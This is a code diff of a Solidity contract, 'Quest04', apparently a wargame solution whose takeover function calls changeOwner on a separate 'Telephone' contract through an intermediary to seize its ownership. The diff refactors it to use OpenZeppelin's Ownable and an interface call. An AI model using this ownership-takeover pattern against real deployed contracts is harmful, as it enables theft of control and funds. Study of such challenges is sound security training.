@@ -1,30 +1,17 @@
 //SPDX-License-Identifier: Unlicense
 pragma solidity ^0.8.0;
 
-contract Quest04 {
-    address public owner;
+import "@openzeppelin/contracts/access/Ownable.sol";
 
-    constructor() {
-        owner = msg.sender;
-    }
+interface Telephone {
+    function changeOwner(address _owner) external;
+}
 
-    modifier onlyOwner() {
-        require(msg.sender == owner, "Only the owner can call this function");
-        _;
-    }
-
+contract Quest04 is Ownable {
     function takeover(address telephoneAddress, address newOwner)
         public
         onlyOwner
     {
-        bytes memory payload = abi.encodeWithSignature(
-            "changeOwner(address)",
-            newOwner
-        );
-
-        (bool success, bytes memory returnData) = telephoneAddress.call(
-            payload
-        );
-        require(success, "Telephone contract call failed");
+        Telephone(telephoneAddress).changeOwner(newOwner);
     }
 }
